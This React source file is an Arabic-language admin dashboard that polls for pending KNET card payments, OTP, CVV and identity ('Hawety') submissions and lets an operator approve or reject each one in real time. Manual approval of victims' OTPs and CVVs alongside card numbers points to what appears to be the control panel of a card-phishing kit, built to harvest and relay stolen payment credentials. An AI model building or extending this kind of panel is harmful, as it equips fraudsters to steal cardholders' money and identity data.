import { useState, useEffect } from "react";
import { useAuth } from "@/_core/hooks/useAuth";

interface Payment {
  id: number;
  cardNumber: string;
  amount: number;
  status: string;
  createdAt: string;
}

interface OTPRequest {
  id: number;
  paymentId: number;
  status: string;
  createdAt: string;
}

interface CVVRequest {
  id: number;
  paymentId: number;
  status: string;
  createdAt: string;
}

interface HawetyRequest {
  id: number;
  paymentId: number;
  status: string;
  createdAt: string;
}

export default function AdminDashboard() {
  const { user } = useAuth();
  const [activeTab, setActiveTab] = useState("payments");
  const [payments, setPayments] = useState<Payment[]>([]);
  const [otpRequests, setOtpRequests] = useState<OTPRequest[]>([]);
  const [cvvRequests, setCvvRequests] = useState<CVVRequest[]>([]);
  const [hawetyRequests, setHawetyRequests] = useState<HawetyRequest[]>([]);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 5000); // Refresh every 5 seconds
    return () => clearInterval(interval);
  }, []);

  const fetchData = async () => {
    setLoading(true);
    try {
      // Fetch pending payments
      const paymentRes = await fetch("/api/trpc/payment.getPendingPayments");
      const paymentData = await paymentRes.json();
      if (paymentData.result?.data) setPayments(paymentData.result.data);

      // Fetch pending OTPs
      const otpRes = await fetch("/api/trpc/payment.getPendingOtps");
      const otpData = await otpRes.json();
      if (otpData.result?.data) setOtpRequests(otpData.result.data);

      // Fetch pending CVVs
      const cvvRes = await fetch("/api/trpc/payment.getPendingCvvs");
      const cvvData = await cvvRes.json();
      if (cvvData.result?.data) setCvvRequests(cvvData.result.data);

      // Fetch pending Hawety
      const hawetyRes = await fetch("/api/trpc/payment.getPendingHawety");
      const hawetyData = await hawetyRes.json();
      if (hawetyData.result?.data) setHawetyRequests(hawetyData.result.data);
    } catch (error) {
      console.error("Error fetching data:", error);
    } finally {
      setLoading(false);
    }
  };

  const handleApprove = async (type: string, id: number) => {
    try {
      const endpoint = type === "payment" ? "approvePayment" : 
                      type === "otp" ? "approveOtp" :
                      type === "cvv" ? "approveCvv" : "approveHawety";

      const response = await fetch(`/api/trpc/payment.${endpoint}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id }),
      });

      if (response.ok) {
        fetchData();
      }
    } catch (error) {
      console.error("Error approving:", error);
    }
  };

  const handleReject = async (type: string, id: number) => {
    try {
      const endpoint = type === "payment" ? "rejectPayment" : 
                      type === "otp" ? "rejectOtp" :
                      type === "cvv" ? "rejectCvv" : "rejectHawety";

      const response = await fetch(`/api/trpc/payment.${endpoint}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id }),
      });

      if (response.ok) {
        fetchData();
      }
    } catch (error) {
      console.error("Error rejecting:", error);
    }
  };

  // Check if user is admin
  if (user?.role !== "admin") {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <h1 className="text-2xl font-bold text-red-600">غير مصرح</h1>
          <p className="text-gray-600">أنت لا تملك صلاحيات الوصول إلى لوحة التحكم</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100 p-4">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-3xl font-bold text-gray-800 mb-8">لوحة تحكم المسؤول</h1>

        {/* Tabs */}
        <div className="flex gap-4 mb-6 border-b border-gray-300">
          {[
            { id: "payments", label: "طلبات KNET", count: payments.length },
            { id: "otp", label: "طلبات OTP", count: otpRequests.length },
            { id: "cvv", label: "طلبات CVV", count: cvvRequests.length },
            { id: "hawety", label: "طلبات الهوية", count: hawetyRequests.length },
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`px-4 py-2 font-medium transition ${
                activeTab === tab.id
                  ? "border-b-2 border-blue-600 text-blue-600"
                  : "text-gray-600 hover:text-gray-800"
              }`}
            >
              {tab.label} ({tab.count})
            </button>
          ))}
        </div>

        {/* Content */}
        <div className="bg-white rounded-lg shadow">
          {loading && <div className="p-4 text-center">جاري التحميل...</div>}

          {activeTab === "payments" && (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-50 border-b">
                  <tr>
                    <th className="px-6 py-3 text-right">رقم البطاقة</th>
                    <th className="px-6 py-3 text-right">المبلغ</th>
                    <th className="px-6 py-3 text-right">الحالة</th>
                    <th className="px-6 py-3 text-right">الإجراء</th>
                  </tr>
                </thead>
                <tbody>
                  {payments.map((payment) => (
                    <tr key={payment.id} className="border-b hover:bg-gray-50">
                      <td className="px-6 py-3">****{payment.cardNumber.slice(-4)}</td>
                      <td className="px-6 py-3">{payment.amount} د.ك</td>
                      <td className="px-6 py-3">{payment.status}</td>
                      <td className="px-6 py-3 flex gap-2">
                        <button
                          onClick={() => handleApprove("payment", payment.id)}
                          className="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded"
                        >
                          قبول
                        </button>
                        <button
                          onClick={() => handleReject("payment", payment.id)}
                          className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded"
                        >
                          رفض
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}

          {activeTab === "otp" && (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-50 border-b">
                  <tr>
                    <th className="px-6 py-3 text-right">رقم الطلب</th>
                    <th className="px-6 py-3 text-right">الحالة</th>
                    <th className="px-6 py-3 text-right">الإجراء</th>
                  </tr>
                </thead>
                <tbody>
                  {otpRequests.map((otp) => (
                    <tr key={otp.id} className="border-b hover:bg-gray-50">
                      <td className="px-6 py-3">{otp.id}</td>
                      <td className="px-6 py-3">{otp.status}</td>
                      <td className="px-6 py-3 flex gap-2">
                        <button
                          onClick={() => handleApprove("otp", otp.id)}
                          className="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded"
                        >
                          قبول
                        </button>
                        <button
                          onClick={() => handleReject("otp", otp.id)}
                          className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded"
                        >
                          رفض
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}

          {activeTab === "cvv" && (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-50 border-b">
                  <tr>
                    <th className="px-6 py-3 text-right">رقم الطلب</th>
                    <th className="px-6 py-3 text-right">الحالة</th>
                    <th className="px-6 py-3 text-right">الإجراء</th>
                  </tr>
                </thead>
                <tbody>
                  {cvvRequests.map((cvv) => (
                    <tr key={cvv.id} className="border-b hover:bg-gray-50">
                      <td className="px-6 py-3">{cvv.id}</td>
                      <td className="px-6 py-3">{cvv.status}</td>
                      <td className="px-6 py-3 flex gap-2">
                        <button
                          onClick={() => handleApprove("cvv", cvv.id)}
                          className="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded"
                        >
                          قبول
                        </button>
                        <button
                          onClick={() => handleReject("cvv", cvv.id)}
                          className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded"
                        >
                          رفض
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}

          {activeTab === "hawety" && (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-50 border-b">
                  <tr>
                    <th className="px-6 py-3 text-right">رقم الطلب</th>
                    <th className="px-6 py-3 text-right">الحالة</th>
                    <th className="px-6 py-3 text-right">الإجراء</th>
                  </tr>
                </thead>
                <tbody>
                  {hawetyRequests.map((hawety) => (
                    <tr key={hawety.id} className="border-b hover:bg-gray-50">
                      <td className="px-6 py-3">{hawety.id}</td>
                      <td className="px-6 py-3">{hawety.status}</td>
                      <td className="px-6 py-3 flex gap-2">
                        <button
                          onClick={() => handleApprove("hawety", hawety.id)}
                          className="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded"
                        >
                          قبول
                        </button>
                        <button
                          onClick={() => handleReject("hawety", hawety.id)}
                          className="bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded"
                        >
                          رفض
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
